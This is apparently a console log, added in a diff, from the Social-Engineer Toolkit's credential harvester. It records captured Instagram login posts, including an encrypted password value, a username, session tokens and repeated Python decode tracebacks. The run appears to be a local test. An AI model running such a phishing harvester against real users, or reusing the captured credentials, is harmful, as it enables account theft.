+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryzhCDhUxTImUQaVH8
+Content-Disposition: form-data; name="ts"
+
+1739125018230
+------WebKitFormBoundaryzhCDhUxTImUQaVH8
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"936619743392459","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"49336b71-6b79-468d-bc7c-4483b3159438\",\"ct\":1659080345,\"sjd\":\"AQhcG7pm3y4MvMrqJl8BufcdYfAL35NzxnTEG8LmK273p8uzEefFA54O8GmQu80AfKKdvsw7lNFwEcxpmOikSOS1IZh8REn7eq7KwSgv1oS9PsRnq6V0N4Z2N2bTpM361DO2bVeoAo8f9Gc3JXcgYg==\",\"sid\":-1}","r":1,"d":"$^|AcaBEb62GBw5DdKKgOLrN3oTW5Er5xwzlxP5S2rO6UiYLaXXAxHm2Anruo3T7v2EkpgxQGEx5hnECVYS-TnYhb4A0w|4291D622-E3F3-429A-8A52-803A21EC8956","s":"cqjae2:agg3e8:iv6dz5","t":1739125075177.05,"b":[1,128],"id":{"claim":""}},1739125018230.7,0,474]],"trigger":"falco:bd_pdc_signals","user":"0","webSessionId":"cqjae2:agg3e8:iv6dz5"}]
+------WebKitFormBoundaryzhCDhUxTImUQaVH8--
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 34198)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0x9c in position 251: invalid start byte
+----------------------------------------
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE PASSWORD FIELD FOUND: enc_password=#PWD_INSTAGRAM_BROWSER:10:1739125028:AXVQACrPZJPUHGSn9K1Q50vUiSI4z5VUU6uXxhEp1XLklKUC1alHZ2RAy6KTWFdrlpc416tUmaX7De+LtYug9qfPz9ZaRM8cEBVPVInI5AkxTEHm2QVSt9jS9afJ31WzSnpEn8WXOZfppvo=
+PARAM: caaF2DebugGroup=0
+POSSIBLE USERNAME FIELD FOUND: loginAttemptSubmissionCount=0
+PARAM: optIntoOneTap=false
+PARAM: queryParams={}
+PARAM: trustedDeviceRecords={}
+POSSIBLE USERNAME FIELD FOUND: username=vedantishukla
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 58488)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0x9c in position 251: invalid start byte
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 47206)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe9 in position 250: invalid continuation byte
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 32896)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0xbd in position 250: invalid start byte
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 39278)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0x9c in position 251: invalid start byte
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 39282)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0x9c in position 251: invalid start byte
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 44606)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0xb8 in position 250: invalid start byte
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 45412)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0x9c in position 251: invalid start byte
+----------------------------------------
